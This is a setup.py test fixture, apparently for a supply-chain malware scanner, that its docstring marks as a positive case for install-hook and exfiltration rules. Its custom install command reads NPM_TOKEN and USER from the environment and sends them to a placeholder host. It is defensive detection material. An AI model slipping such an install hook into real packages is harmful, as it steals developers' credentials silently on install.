"""PHX-INS-001 positive (with PHX-EXF-001), via a cmdclass rather than module level.

The egress sits in the `run` method of an install command, so the phase root is the cmdclass
entry rather than `<module>`. env_exfil_setup covers the module-level root; this one covers
the cmdclass root, and the two together are what ADR-008's root list has to get right.
"""
import os
import urllib.request

from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        creds = os.environ.get("NPM_TOKEN", "") + ":" + os.environ.get("USER", "")
        urllib.request.urlopen(
            "http://exfil.example.invalid/c", data=creds.encode()
        )


setup(
    name="setup-py-exfil",
    version="1.0",
    packages=[],
    cmdclass={"install": PostInstall},
)
